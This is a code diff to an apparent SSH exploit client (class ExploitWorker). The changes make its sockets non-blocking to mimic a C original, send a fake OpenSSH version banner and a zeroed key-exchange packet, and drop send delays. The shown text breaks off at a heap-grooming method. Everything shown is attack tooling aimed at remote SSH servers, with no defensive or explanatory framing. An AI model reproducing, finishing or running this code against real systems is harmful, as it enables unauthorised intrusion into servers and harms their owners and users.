@@ -1,0 +1,104 @@
+@@ -240,14 +240,26 @@ class ExploitWorker:
+         if self.verbose:
+             print(f"[W{self.worker_id:03d}] {message}")
+ 
++    def recv_nonblocking(self, size: int, timeout: float = 5.0) -> bytes:
++        """Receive with non-blocking socket using select"""
++        import select
++        ready = select.select([self.sock], [], [], timeout)
++        if ready[0]:
++            try:
++                return self.sock.recv(size)
++            except BlockingIOError:
++                return b''
++        return b''
++
+     def setup_connection(self) -> bool:
+-        """Establish TCP connection"""
++        """Establish TCP connection with non-blocking I/O like C code"""
+         try:
+             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+             self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+             self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+-            self.sock.settimeout(30)
++            self.sock.settimeout(10)  # Only for connect phase
+             self.sock.connect((self.target_ip, self.target_port))
++            self.sock.setblocking(False)  # Match C's O_NONBLOCK
+             self.connection_start = time.perf_counter()
+             self.log("Connected")
+             return True
+@@ -258,37 +270,53 @@ class ExploitWorker:
+     def send_ssh_version(self):
+         """Send SSH protocol version"""
+         version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
+-        self.sock.sendall(version)
+-
+-    def receive_ssh_version(self) -> bool:
+-        """Receive SSH version from server"""
+         try:
+-            version = self.sock.recv(256)
+-            return len(version) > 0
+-        except:
+-            return False
++            self.sock.sendall(version)
++        except Exception as e:
++            if self.verbose:
++                self.log(f"Failed to send version: {e}")
++            raise
+ 
+     def send_packet(self, packet_type: int, data: bytes):
+-        """Send SSH protocol packet"""
++        """Send SSH protocol packet - NO DELAYS like C code"""
+         packet_len = len(data) + 1
+         packet = struct.pack('>I', packet_len)
+         packet += bytes([0, packet_type])
+         packet += data
+ 
+-        self.sock.sendall(packet)
+-        time.sleep(0.001)  # Small delay to prevent buffer overflow
++        try:
++            # Send all data - may get EAGAIN/EWOULDBLOCK on non-blocking socket
++            total_sent = 0
++            while total_sent < len(packet):
++                try:
++                    sent = self.sock.send(packet[total_sent:])
++                    if sent == 0:
++                        raise RuntimeError("Socket connection broken")
++                    total_sent += sent
++                except BlockingIOError:
++                    # Non-blocking socket would block - wait briefly and retry
++                    import select
++                    select.select([], [self.sock], [], 0.1)
++                    continue
++        except Exception as e:
++            if self.verbose:
++                self.log(f"Send packet error: {e}")
++            raise
+ 
+     def send_kex_init(self):
+         """Send SSH Key Exchange Init"""
+-        self.send_packet(20, b'\x00' * 36)  # SSH_MSG_KEXINIT
++        self.send_packet(20, b'\x00' * 36)
+ 
+     def receive_kex_init(self) -> bool:
+         """Receive Key Exchange Init"""
+         try:
+-            data = self.sock.recv(4096)
+-            return len(data) > 0
+-        except:
+-            return False
++            data = self.recv_nonblocking(4096, timeout=5)
++            if data:
++                self.log(f"Received KEX_INIT ({len(data)} bytes)")
++                return True
++        except Exception as e:
++            self.log(f"KEX receive error: {e}")
++        return False
+ 
+     def perform_ssh_handshake(self) -> bool:
+         """Complete SSH protocol handshake"""
+@@ -324,28 +352,30 @@ class ExploitWorker:
+         return bytes(data)
+ 
+     def prepare_heap(self):
+-        """Heap groom
